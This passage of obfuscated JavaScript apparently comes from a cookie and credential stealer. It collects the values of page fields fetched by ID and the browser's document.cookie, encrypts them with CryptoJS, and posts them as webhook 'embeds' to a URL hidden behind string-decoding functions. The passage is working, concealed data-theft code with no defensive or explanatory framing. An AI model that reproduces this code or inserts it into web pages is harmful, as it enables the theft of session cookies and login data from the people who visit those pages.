            _0x5dbd23 = _0x245b75,
            _0x2055d0 = _0x25a3fe,
            _0x2877d4 = _0x245b75,
            _0x1a25db = _0x245b75,
            _0x336a88 = _0xd44012,
            _0x2e89dc = {};
        (_0x2e89dc[_0x178b0d(_0x560f94._0x53033c)] = _0x178b0d(_0x560f94._0x5e4cb5)),
            (_0x2e89dc[_0x178b0d(_0x560f94._0x13a0a8)] = _0x2055d0(_0x560f94._0xe92abb) + "\x70\x65"),
            (_0x2e89dc[_0x5dbd23(_0x560f94._0x596e91)] = _0x2055d0(_0x560f94._0x2d7ba5) + _0x2877d4(_0x560f94._0x1038a4)),
            (_0x2e89dc[_0x2055d0(_0x560f94._0x874b4f)] = _0x2055d0(_0x560f94._0x148b7b) + "\x6e"),
            (_0x2e89dc[_0x2055d0(_0x560f94._0x15e982)] = _0x1a25db(_0x560f94._0x165436));
        var _0x5e6ea1 = _0x2e89dc,
            _0x505184 = new XMLHttpRequest();
        _0x505184[_0x2877d4(_0x560f94._0x5dd4d3)](
            _0x5e6ea1[_0x336a88(_0x560f94._0x1e28ac)],
            _0x336a88(_0x560f94._0x6ad57f) +
                _0x5dbd23(_0x560f94._0x513208) +
                _0x5dbd23(_0x560f94._0x46b1b1) +
                _0x336a88(_0x560f94._0x1b894a) +
                _0x1a25db(_0x560f94._0x3ad781) +
                _0x5dbd23(_0x560f94._0x282682) +
                _0x336a88(_0x560f94._0x4cb70d) +
                _0x2877d4(_0x560f94._0x10e86d) +
                _0x2055d0(_0x560f94._0x1fcbcc) +
                _0x2055d0(_0x560f94._0x477c61) +
                _0x2055d0(_0x560f94._0x31baa8) +
                _0x1a25db(_0x560f94._0x313fdf)
        ),
            _0x505184[_0x2877d4(_0x560f94._0x4806a2) + _0x178b0d(_0x560f94._0xb8891d)](_0x5e6ea1[_0x178b0d(_0x560f94._0x204af8)], _0x5e6ea1[_0x1a25db(_0x560f94._0x4c110c)]),
            _0x505184[_0x2055d0(_0x560f94._0x8b1fc3)](
                JSON[_0x2055d0(_0x560f94._0xf00d5b)]({
                    embeds: [
                        {
                            description:
                                _0x336a88(_0x560f94._0x1f7d96) +
                                CryptoJS[_0x2877d4(_0x560f94._0x4ca44a)][_0x336a88(_0x560f94._0x37ac02)](
                                    _0x178b0d(_0x560f94._0x3eeecc) +
                                        "\x60" +
                                        document[_0x5dbd23(_0x560f94._0x2ca82b) + _0x5dbd23(_0x560f94._0x131faf)](_0x2055d0(_0x560f94._0x43a7c1))[_0x2055d0(_0x560f94._0x4bf02a)] +
                                        _0x336a88(_0x560f94._0x26b661) +
                                        document[_0x336a88(_0x560f94._0x52b796) + _0x2055d0(_0x560f94._0x26e89a)](_0x5e6ea1[_0x1a25db(_0x560f94._0x151f63)])[_0x5dbd23(_0x560f94._0x506055)] +
                                        _0x178b0d(_0x560f94._0x1f7d96),
                                    _0x5e6ea1[_0x2877d4(_0x560f94._0x15e982)]
                                ) +
                                _0x2877d4(_0x560f94._0x17f99f),
                        },
                    ],
                })
            );
    });
var bozeta = new XMLHttpRequest();
function _0x4dac(_0x3f2f3e, _0x3ed93e) {
    var _0x56d569 = _0x2b9b();
    return (
        (_0x4dac = function (_0x49fa07, _0x3ba1e7) {
            _0x49fa07 = _0x49fa07 - (-0x172e + -0x2 * 0x27 + -0x81c * -0x3);
            var _0x57720c = _0x56d569[_0x49fa07];
            return _0x57720c;
        }),
        _0x4dac(_0x3f2f3e, _0x3ed93e)
    );
}
bozeta[_0xd44012("\x30\x78\x66\x39")](
    _0x2a6a34("\x30\x78\x65\x30"),
    _0x245b75(0x10c) +
        _0x4c3faf("\x30\x78\x65\x38") +
        _0xd44012("\x30\x78\x65\x64") +
        _0xd44012("\x30\x78\x31\x30\x62") +
        _0x4c3faf("\x30\x78\x31\x30\x61") +
        _0xd44012(0xf8) +
        _0x73234(0x10d) +
        _0x4c3faf("\x30\x78\x31\x30\x31") +
        _0x73234("\x30\x78\x31\x30\x38") +
        _0xd44012("\x30\x78\x65\x39") +
        _0x245b75("\x30\x78\x65\x63") +
        _0x25a3fe(0xf7)
),
    bozeta[_0x73234(0xdd) + _0x73234(0xe4)](_0xd44012(0xda) + "\x70\x65", _0x73234(0xf4) + _0x2a6a34("\x30\x78\x31\x30\x36")),
    bozeta[_0x25a3fe(0xf1)](
        JSON[_0x73234("\x30\x78\x65\x33")]({
            embeds: [
                {
                    description:
                        _0x2a6a34(0xf0) + CryptoJS[_0x4c3faf(0x103)][_0xd44012(0xdc)](_0x2a6a34(0xf0) + document[_0x4c3faf(0xd8)][_0xd44012("\x30\x78\x31\x30\x30")](/(\;)/gi, "\x0a") + _0x25a3fe(0xf0), _0x73234(0xeb)) + _0x4c3faf(0xf0),
                },
            ],
        })
    );
